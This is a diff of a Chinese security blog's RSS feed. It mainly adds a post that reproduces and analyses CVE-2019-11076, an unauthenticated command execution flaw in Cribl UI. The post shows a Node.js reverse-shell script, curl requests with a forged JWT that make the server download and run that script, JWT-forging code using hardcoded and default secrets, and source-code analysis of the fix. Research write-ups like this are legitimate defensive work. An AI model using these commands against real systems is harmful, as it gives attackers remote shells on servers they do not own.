@@ -5,8 +5,379 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Fri, 24 Jan 2020 00:58:25 +0800</lastBuildDate>
+    <lastBuildDate>Sat, 01 Feb 2020 17:02:55 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE 2019 11076 Cribl UI 1.5.0 未授权命令执行漏洞分析</title>
+      <link>https://syang-ng.github.io/2020/02/cve-2019-11076-cribl-ui-unauthorized-commands-execution/</link>
+      <pubDate>Sat, 01 Feb 2020 17:02:55 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/02/cve-2019-11076-cribl-ui-unauthorized-commands-execution/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;前几天瞎逛 Github 看到的一个 CVE，就跟着调试一下，顺便记录一下调试过程中的收获。&lt;/p&gt;
+
+&lt;p&gt;repo 链接：&lt;a href=&#34;https://github.com/livehybrid/poc-cribl-rce&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;poc-cribl-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;以下是作者提供的描述：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;h2 id=&#34;info&#34;&gt;Info&lt;/h2&gt;
+
+&lt;p&gt;Tested on Cribl v1.5.0 - Previous versions not tested but likely vulnerable.
+A valid JWT token can be transfered from and injected into the session of another Cribl instance, giving the user unauthorised access.
+Furthermore, the encryption key used on to generate the JWT/Session can be used to create a valid session for any username, with an extended expiry.&lt;/p&gt;
+
+&lt;p&gt;This, combined with the ability to run scripts within Cribl allows a remote attacker to run malicious code on a Crible instance in order to gain further control.
+An example of such can be seen below, using the scripts page and a long expiry JWT token, it was possible to create a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;Tested using Docker (Alpine).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
+
+&lt;p&gt;根据作者的描述，该问题在 1.5.0 上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用 1.4.3 的环境进行测试：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# pull docker
+docker pull cribl/cribl:1.4.3
+# run docker
+docker run -p 9000:9000 -d cribl/cribl:1.4.3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后访问 9000 端口，可以看到如下页面，使用 admin/admin 即可登录：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/login.png&#34; alt=&#34;Cribl UI&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;漏洞测试&#34;&gt;漏洞测试&lt;/h2&gt;
+
+&lt;p&gt;根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹 shell 的方式获得可以交互的命令行。考虑到 cribl 本身具有 nodejs 环境，因此可以考虑结合 nodejs 的反弹 shell 脚本进行攻击。&lt;/p&gt;
+
+&lt;p&gt;因此，漏洞的利用思路如下：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;使用 wget 或其他方式将反弹 shell 的脚本写入受影响的环境&lt;/li&gt;
+&lt;li&gt;利用 nodejs 执行该脚本，反弹 shell&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;第一步，先在自己的 vps 上部署 nodejs 的反弹 shell 脚本（这里需要将 &lt;code&gt;YOUR_REMOTE_IP_OR_FQDN&lt;/code&gt; 替换为具体的地址或域名）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var net = require(&amp;quot;net&amp;quot;), sh = require(&amp;quot;child_process&amp;quot;).exec(&amp;quot;/bin/sh&amp;quot;);
+var client = new net.Socket();
+client.connect(6669, &amp;quot;YOUR_REMOTE_IP_OR_FQDN&amp;quot;, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+sh.stderr.pipe(client);});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后准备好监听 6669 端口：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;nc -lvp 6669
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;下一步就是使用任意命令执行的漏洞，先利用 wget 下载反弹 shell 的脚本：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# wget
+curl &#39;http://127.0.0.1:9000/api/v1/system/scripts&#39; \
+-H &#39;Content-Type: application/json&#39; \
+-H &#39;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&#39; \
+--data-binary &#39;{&amp;quot;id&amp;quot;:&amp;quot;runme&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;/usr/bin/wget&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;http://xxx.xxx.xxx/shell.js&amp;quot;,&amp;quot;-P&amp;quot;,&amp;quot;/opt&amp;quot;],&amp;quot;env&amp;quot;:{}}&#39; --compressed
+
+# {&amp;quot;count&amp;quot;:1,&amp;quot;items&amp;quot;:[{&amp;quot;command&amp;quot;:&amp;quot;/usr/bin/wget&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;http://static.syang.xyz/shell.js&amp;quot;,&amp;quot;-P&amp;quot;,&amp;quot;/opt&amp;quot;],&amp;quot;env&amp;quot;:{},&amp;quot;id&amp;quot;:&amp;quot;runme&amp;quot;}]}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# exec wget
+curl &#39;http://127.0.0.1:9000/api/v1/system/scripts/runme/run&#39; \
+-H &#39;Content-Type: application/json&#39; \
+-H &#39;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&#39; \
+--data-binary &#39;{}&#39; --compressed
+
+# {&amp;quot;pid&amp;quot;:36,&amp;quot;stdout&amp;quot;:&amp;quot;N/A&amp;quot;,&amp;quot;stderr&amp;quot;:&amp;quot;N/A&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# nodejs
+curl &#39;http://127.0.0.1:9000/api/v1/system/scripts&#39; \
+ -H &#39;Content-Type: application/json&#39;\
+ -H &#39;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&#39; \
+--data-binary &#39;{&amp;quot;id&amp;quot;:&amp;quot;reverseit&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;node&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;/opt/shell.js&amp;quot;],&amp;quot;env&amp;quot;:{}}&#39; --compressed
+
+# {&amp;quot;count&amp;quot;:1,&amp;quot;items&amp;quot;:[{&amp;quot;command&amp;quot;:&amp;quot;node&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;/opt/shell.js&amp;quot;],&amp;quot;env&amp;quot;:{},&amp;quot;id&amp;quot;:&amp;quot;reverseit&amp;quot;}]}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# exec nodejs
+curl &#39;http://127.0.0.1:9000/api/v1/system/scripts/reverseit/run&#39; \
+-H &#39;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&#39; \
+--data-binary &#39;{}&#39; --compressed
+
+# {&amp;quot;pid&amp;quot;:37,&amp;quot;stdout&amp;quot;:&amp;quot;N/A&amp;quot;,&amp;quot;stderr&amp;quot;:&amp;quot;N/A&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功反弹 shell：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/shell.png&#34; alt=&#34;反弹 shell&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;PS：原作者 poc 中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的 Cookie…&lt;/p&gt;
+
+&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+
+&lt;p&gt;下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问 &lt;a href=&#34;http://localhost:9000/settings/scripts&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://localhost:9000/settings/scripts&lt;/a&gt; 可以看到之前 poc 所生成的两项：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/scripts.png&#34; alt=&#34;scripts&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如果我们使用授权的 admin / admin 账号，可以直接增加并执行命令：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/test.png&#34; alt=&#34;test&#34; /&gt;
+&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/run.png&#34; alt=&#34;run&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的 JWT token进行任意命令执行。&lt;/p&gt;
+
+&lt;p&gt;下面结合源码来分析漏洞所在。可以看到文件夹结构如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/tree.png&#34; alt=&#34;tree&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;结合 docker 的 entrypoint.sh：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;#!/bin/sh
+
+# Assumed to be an s3 location
+if [ -n &amp;quot;$CRIBL_CONFIG_LOCATION&amp;quot; ]; then
+    aws s3 sync &amp;quot;$CRIBL_CONFIG_LOCATION&amp;quot; /opt/cribl/local/cribl
+fi
+
+if [ -n &amp;quot;$CRIBL_SCRIPTS_LOCATION&amp;quot; ]; then
+    mkdir -p /opt/cribl/scripts
+    aws s3 sync &amp;quot;$CRIBL_SCRIPTS_LOCATION&amp;quot; /opt/cribl/scripts
+    chmod -R 755 /opt/cribl/scripts
+fi
+
+if [ &amp;quot;$1&amp;quot; = &amp;quot;cribl&amp;quot; ]; then
+    node /opt/cribl/bin/cribl.bundle.js server
+fi
+
+exec &amp;quot;$@&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;以及 start.sh：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;#!/bin/bash
+
+NODECMD=node
+STARTCMD=&amp;quot;$NODECMD cribl.bundle.js server&amp;quot;
+echo &amp;quot;$STARTCOMD&amp;quot;
+
+DIR=&amp;quot;$( cd &amp;quot;$( dirname &amp;quot;${BASH_SOURCE[0]}&amp;quot; )&amp;quot; &amp;amp;&amp;amp; pwd )&amp;quot;
+cd $DIR
+
+# exec the command so it can receive kill signals
+exec $STARTCMD
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到最核心的代码为 &lt;code&gt;cribl.bundle.js&lt;/code&gt;，进入分析：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/cribl.bundle.js.png&#34; alt=&#34;cribl.bundle.js&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以很明显看到该代码是由 webpack 之类工具打包生成的了。。第一眼看上去一头雾水（─.─||）
+那么就需要结合一定的技巧进行分析，可以搜索关键词 &lt;code&gt;cribl_auth&lt;/code&gt;，因为 Cookie 中的 &lt;code&gt;cribl_auth&lt;/code&gt; 字段即 JWT token，定位到下图的关键代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/cribl_auth.png&#34; alt=&#34;关键代码&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;美化之后如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var f = &amp;quot;d2hvIGxldCB0aGUgZG9ncyBvdXQ=&amp;quot;;
+var p = 4 * 3600;
+var h = &amp;quot;cribl_auth&amp;quot;;
+var d = &amp;quot;/auth&amp;quot;;
+var v = &amp;quot;Bearer &amp;quot;;
+var m = [d + &amp;quot;/&amp;quot;];
+
+function y(e, t, r) {
+    if (e.method === &amp;quot;OPTIONS&amp;quot;) {
+        r();
+        return
+    }
+    for (var n = 0; n &amp;lt; m.length; n++) {
+        if (e.path.startsWith(&amp;quot;&amp;quot; + m[n])) {
+            r();
+            return
+        }
+    }
+    var i = e.cookies &amp;amp;&amp;amp; e.cookies[h];
+    if (!i) {
+        var o = e.header(&amp;quot;authentication&amp;quot;);
+        if (o &amp;amp;&amp;amp; o.startsWith(v)) {
+            i = o.substr(v.length)
+        }
+    }
+    try {
+        a.decode(i || &amp;quot;&amp;quot;, f);
+        r()
+    } catch (e) {
+        t.sendStatus(401)
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到逻辑非常简单，只要 jwt token 解码成功即可成功通过验证，而且无需如 admin 之类的特定用户名。结合作者的描述，可以认为主要还是硬编码的 secret &lt;code&gt;d2hvIGxldCB0aGUgZG9ncyBvdXQ=&lt;/code&gt; 增大了伪造的可能性降低了程序的安全性。&lt;/p&gt;
+
+&lt;p&gt;顺便看看这个 secret 是什么：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;echo &amp;quot;d2hvIGxldCB0aGUgZG9ncyBvdXQ=&amp;quot; | base64 -d
+who let the dogs out
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Emmm，开发者你开心就好。&lt;/p&gt;
+
+&lt;p&gt;最后来看一下开发者是使用哪一个库来生成 jwt token 的，搜索 JWT 关键词：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CVE-2019-11076-Cribl-UI-Unauthorized-Commands-Execution/jwt.png&#34; alt=&#34;JWT&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到：&lt;a href=&#34;https://github.com/hokaccha/node-jwt-simple&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/hokaccha/node-jwt-simple&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;写个脚本印证一下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var jwt = require(&#39;jwt-simple&#39;);
+var payload = {
+  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,
+  &amp;quot;exp&amp;quot;: 9999999999
+};
+var secret = &#39;d2hvIGxldCB0aGUgZG9ncyBvdXQ=&#39;;
+
+// encode
+var token = jwt.encode(payload, secret);
+console.log(token);
+
+// decode
+var decoded = jwt.decode(token, secret);
+console.log(decoded);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到和 poc 的作者所使用的 cookie 是一样的☑️：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;node test.js
+# output
+# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY
+# { username: &#39;admin&#39;, exp: 9999999999 }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;修复&#34;&gt;修复&lt;/h2&gt;
+
+&lt;p&gt;让我们看看后续版本是如何修复的，老规矩，使用 v1.5.1 版本的 image，映射到 9001 端口：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# pull docker
+docker pull cribl/cribl:1.5.1
+# run docker
+docker run -p 9001:9000 -d cribl/cribl:1.5.1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到之前的 exp 已经不能生效了：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl &#39;http://127.0.0.1:9001/api/v1/system/scripts&#39; \
+-H &#39;Content-Type: application/json&#39; \
+-H &#39;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&#39; \
+--data-binary &#39;{&amp;quot;id&amp;quot;:&amp;quot;runme&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;/usr/bin/wget&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;http://static.syang.xyz/shell.js&amp;quot;,&amp;quot;-P&amp;quot;,&amp;quot;/opt&amp;quot;],&amp;quot;env&amp;quot;:{}}&#39; --compressed
+
+# output
+# Unauthorized
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;跟进源码，查看 v1.5.1 对程序进行了何种修改：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var p = 4 * 3600;
+var d = &amp;quot;cribl_auth&amp;quot;;
+var h = &amp;quot;/auth&amp;quot;;
+var m = &amp;quot;Bearer &amp;quot;;
+var v = [h + &amp;quot;/&amp;quot;];
+var g;
+
+function y() {
+    if (!g) {
+        g = l.getCreateCriblSecret()
+    }
+    return g
+}
+
+function b(e, t, r) {
+    if (e.method === &amp;quot;OPTIONS&amp;quot;) {
+        r();
+        return
+    }
+    for (var n = 0; n &amp;lt; v.length; n++) {
+        if (e.path.startsWith(&amp;quot;&amp;quot; + v[n])) {
+            r();
+            return
+        }
+    }
+    var i = e.cookies &amp;amp;&amp;amp; e.cookies[d];
+    if (!i) {
+        var o = e.header(&amp;quot;authorization&amp;quot;);
+        if (o &amp;amp;&amp;amp; o.startsWith(m)) {
+            i = o.substr(m.length)
+        }
+    }
+    y().then(function (e) {
+        var t = a.decode(i || &amp;quot;&amp;quot;, e);
+        if (!t.username) throw new Error(&amp;quot;Invalid auth token, missing username&amp;quot;);
+        r()
+    }).catch(function (e) {
+        t.sendStatus(401)
+    })
+}
+
+// 其中 l.getCreateCriblSecret = w
+
+function w() {
+    if (!b) {
+        var e = c.join(process.env.CRIBL_HOME || &amp;quot;&amp;quot;, &amp;quot;local&amp;quot;, &amp;quot;cribl&amp;quot;, &amp;quot;auth&amp;quot;, &amp;quot;cribl.secret&amp;quot;);
+        b = o.callbackToPromise(l.readFile, e).catch(function (t) {
+            return u.mkdirp(c.dirname(e)).then(function () {
+                var t = a.randomBytes(256).toString(&amp;quot;base64&amp;quot;);
+                return u.atomicFileWrite(e, t).then(function () {
+                    return t
+                })
+            })
+        }).then(function (e) {
+            return Buffer.from(e.toString(), &amp;quot;base64&amp;quot;)
+        })
+    }
+    return b
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到关键的 secret 不再硬编码，改成了从 &lt;code&gt;/opt/local/cribl/auth/cribl.secret&lt;/code&gt; 该文件中进行读取。&lt;/p&gt;
+
+&lt;p&gt;那么考虑到使用 docker 中自带的密钥，是否可以伪造 cookie？&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var jwt = require(&#39;jwt-simple&#39;);
+var payload = {
+  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,
+  &amp;quot;exp&amp;quot;: 9999999999
+};
+
+// encode
+var secret = Buffer.from(&amp;quot;vCN2P8hvUL2mvY6JZ5HhkXyNJzaSVvhOhBuZF9h34K6UbrhbPnr23/shnY09hZPUpKOTDIMql1POyPOOEygj67LPyYd57hxLmMgbVQ8IcsxLF3pu+gcc0qzrgzInWpSRXL0t4hTKDhRwR94xo/1G0nZfG8uh8M7jH3Wnr80Jujnyx0fjYhq1sWTd3ESnT2c8fUtqLwyEyx2yGeXKp+pXmrIYgFtjxDemsuUVzZlrj/fTgF+IlgWS2cxxkBRpAxxVurfZVE1E3oP8VM+73QMFOMcWrT8ABqEvhFhGBC/izNR7lKF7rkDjkwftc8UY0uvDOImaC/H/GM3ab53pyDdcNQ==&amp;quot;, &amp;quot;base64&amp;quot;)
+var token = jwt.encode(payload, secret);
+
+// decode
+var decoded = jwt.decode(token, secret);
+console.log(decoded);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Emmm，实验成功了。。只能说如果开发者在生产环境中不换默认的 secret 最后还是会翻车，照样未授权 RCE。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl &#39;http://127.0.0.1:9001/api/v1/system/scripts&#39; \
+-H &#39;Content-Type: application/json&#39; \
+-H &#39;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.zRHkFfc7WtMIqFtfvSd2FUyxHxW8TlnVZtn87sNMVYc&#39; \
+--data-binary &#39;{&amp;quot;id&amp;quot;:&amp;quot;list&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;ls&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;-al&amp;quot;],&amp;quot;env&amp;quot;:{}}&#39; --compressed
+# output
+# {&amp;quot;count&amp;quot;:1,&amp;quot;items&amp;quot;:[{&amp;quot;command&amp;quot;:&amp;quot;ls&amp;quot;,&amp;quot;args&amp;quot;:[&amp;quot;-al&amp;quot;],&amp;quot;env&amp;quot;:{},&amp;quot;id&amp;quot;:&amp;quot;list&amp;quot;}]}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>己亥年书摘</title>
@@ -39,7 +410,7 @@
 &lt;h3 id=&#34;树上的男爵-伊塔洛-卡尔维诺&#34;&gt;树上的男爵 - 伊塔洛·卡尔维诺&lt;/h3&gt;
 
 &lt;blockquote&gt;
-&lt;p&gt;总而言之 他染上了讲故事人的那种瘾头，分不清真正发生过的事情和杜撰出来的故事之中到底哪个更美。真事使人回忆起许多属于过去的时光、细腻的感情、烦扰、幸福、疑惑、虚荣和对自己的厌恶，而故事中可以大刀阔斧 一切显得轻而易举。但变来变去，最后发觉自己在回头去讲真实生活中体验过或发生过的事情。&lt;/p&gt;
+&lt;p&gt;总而言之，他染上了讲故事人的那种瘾头，分不清真正发生过的事情和杜撰出来的故事之中到底哪个更美。真事使人回忆起许多属于过去的时光、细腻的感情、烦扰、幸福、疑惑、虚荣和对自己的厌恶，而故事中可以大刀阔斧 一切显得轻而易举。但变来变去，最后发觉自己在回头去讲真实生活中体验过或发生过的事情。&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;h3 id=&#34;人类的故事-亨德里克-房龙&#34;&gt;人类的故事 - 亨德里克·房龙&lt;/h3&gt;
@@ -4429,185 +4800,6 @@ if __name__ == &#39;__main__&#39;:
 &lt;li&gt;&lt;a href=&#34;https://www.freebuf.com/articles/others-articles/132283.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw刷题之calc&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/d59a41d85af1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw calc&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>WinRAR 目录穿越漏洞研究小记</title>
-      <link>https://syang-ng.github.io/2019/02/winrar-absolute-path-traversal-vulnerability-cve-2018-20250/</link>
-      <pubDate>Mon, 25 Feb 2019 19:19:01 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2019/02/winrar-absolute-path-traversal-vulnerability-cve-2018-20250/</guid>
-      <description>
-
-&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
-
-&lt;p&gt;在摸鱼的时候看到先知上的一篇文章：&lt;a href=&#34;https://xz.aliyun.com/t/4169&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;WinRAR目录穿越漏洞&lt;/a&gt;，发现 WinRAR 爆出了一个惊天大洞（误），虽然称不上用处巨大，但是非常好玩。漏洞介绍如下：&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;WinRAR在解压处理ACE格式的文件的过程中存在一处目录穿越漏洞，该漏洞允许解压过程中向任意目录写入文件，利用该漏洞可以向开机启动目录中写入恶意文件导致机器开机时执行恶意代码。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;再贴一段国外研究者的介绍：&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;The exploit works by just extracting an archive, and puts over 500 million users at risk. This vulnerability has existed for over 19 years(!) and forced WinRAR to completely drop support for the vulnerable format.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
-
-&lt;p&gt;先贴一份 Exploit 地址，感兴趣的朋友可以直接本地复现&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/WyAtu/CVE-2018-20250&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/WyAtu/CVE-2018-20250&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;这里有一份本人的 &lt;a href=&#34;http://static.syang.xyz/demo/CVE-2018-20250.rar&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;demo&lt;/a&gt;，感兴趣的朋友可以下载，解压成功后会在 &lt;code&gt;C:\114514&lt;/code&gt; 路径多出一个 &lt;code&gt;oc.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
-
-&lt;p&gt;根据报告所描述，可以看到漏洞的起因主要在于 WinRAR 所使用的 &lt;code&gt;UNACEV2.dll&lt;/code&gt; 编译的时间极早（可以追随到 2006 年），也没有开启任何的保护措施（如 ASLR, DEP），由此被研究者注意到，并成功通过 fuzz 发现了一个 &lt;code&gt;Absolute Path Traversal&lt;/code&gt;（任意路径穿越）漏洞。&lt;/p&gt;
-
-&lt;p&gt;运行 &lt;code&gt;acefile.py&lt;/code&gt; 脚本，我们能显示 ace 文件的结构：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# python acefile.py --headers demo.rar
-volume
-    filename    demo.rar
-    filesize    208
-    headers     MAIN:1 FILE:2 others:0
-header
-    hdr_crc     0x286b
-    hdr_size    49
-    hdr_type    0x00        MAIN
-    hdr_flags   0x9000      ADVERT|SOLID
-    magic       b&#39;**ACE**&#39;
-    eversion    20          2.0
-    cversion    20          2.0
-    host        0x02        Win32
-    volume      0
-    datetime    0x4e561810  2019-02-22 03:00:32
-    reserved1   97 4f f6 aa 00 00 00 00
-    advert      b&#39;*UNREGISTERED VERSION*&#39;
-    comment     b&#39;&#39;
-    reserved2   b&#39;&#39;
-header
-    hdr_crc     0xe4ea
-    hdr_size    39
-    hdr_type    0x01        FILE32
-    hdr_flags   0x8001      ADDSIZE|SOLID
-    packsize    36
-    origsize    36
-    datetime    0x4e55b063  2019-02-21 22:03:06
-    attribs     0x00000020  ARCHIVE
-    crc32       0x772b6618
-    comptype    0x00        stored
-    compqual    0x03        normal
-    params      0x000a
-    reserved1   0x4554
-    filename    b&#39;hint.txt&#39;
-    comment     b&#39;&#39;
-    ntsecurity  b&#39;&#39;
-    reserved2   b&#39;&#39;
-header
-    hdr_crc     0xb652
-    hdr_size    50
-    hdr_type    0x01        FILE32
-    hdr_flags   0x8001      ADDSIZE|SOLID
-    packsize    22
-    origsize    22
-    datetime    0x4e55b063  2019-02-21 22:03:06
-    attribs     0x00000020  ARCHIVE
